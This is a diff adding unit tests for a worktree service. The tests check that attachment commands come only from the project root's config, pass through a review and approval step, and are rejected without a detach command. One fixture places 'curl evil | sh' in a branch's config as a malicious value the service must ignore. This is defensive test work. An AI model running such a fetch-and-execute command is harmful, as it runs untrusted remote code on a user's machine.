@@ -2135,6 +2135,60 @@ describe("WorktreeLifecycleService", () => {
       expect(monitor.setResourceConnectCommand).toHaveBeenLastCalledWith(undefined);
     });
 
+    it("reads attachments from the project root, never a branch's copy", async () => {
+      serveFiles({
+        "/root/.daintree/config.json": {
+          attachments: { tunnel: { attach: ["ngrok up"], detach: ["ngrok down"] } },
+        },
+        "/wt/.daintree/config.json": {
+          attachments: { tunnel: { attach: ["curl evil | sh"], detach: ["true"] } },
+        },
+      });
+
+      const resolved = await service.resolveAttachments(ROOT);
+
+      expect(resolved?.resolved.path).toMatch(/[/\\]root[/\\]\.daintree[/\\]config\.json$/);
+      expect(resolved?.attachments).toEqual({
+        tunnel: { attach: ["ngrok up"], detach: ["ngrok down"] },
+      });
+    });
+
+    it("lets every worktree's card review the root's attachment commands", async () => {
+      serveFiles({
+        "/root/.daintree/config.json": {
+          attachments: { tunnel: { attach: ["ngrok up"], detach: ["ngrok down"] } },
+        },
+        "/wt/.daintree/config.json": { setup: ["npm install"] },
+      });
+
+      const review = await service.getCommandReview(WT, ROOT);
+      const labels = review?.sources.flatMap((s) => s.groups.map((g) => g.label));
+      expect(labels).toEqual(["Setup", 'Attachment "tunnel" attach', 'Attachment "tunnel" detach']);
+
+      await service.approveCommandReview(WT, ROOT, review!.fingerprint);
+      const root = await service.resolveAttachments(ROOT);
+      expect(await service.isConfigApproved(root!.resolved, ROOT)).toBe(true);
+      expect(await service.getCommandReview(WT, ROOT)).toBeNull();
+    });
+
+    it("lists a branch's unchanged copy of the root config once", async () => {
+      const config = {
+        setup: ["npm install"],
+        attachments: { tunnel: { attach: ["ngrok up"], detach: ["ngrok down"] } },
+      };
+      serveFiles({ "/root/.daintree/config.json": config, "/wt/.daintree/config.json": config });
+
+      const review = await service.getCommandReview(WT, ROOT);
+      expect(review?.sources).toHaveLength(1);
+    });
+
+    it("rejects a config whose attachment has no detach command", async () => {
+      serveFiles({
+        "/root/.daintree/config.json": { attachments: { tunnel: { attach: ["ngrok up"] } } },
+      });
+      expect(await service.resolveAttachments(ROOT)).toBeNull();
+    });
+
     it("runs setup commands from the user's own config without asking", async () => {
       serveFiles({
         "/home/testuser/.daintree/projects/_root/config.json": { setup: ["npm install"] },
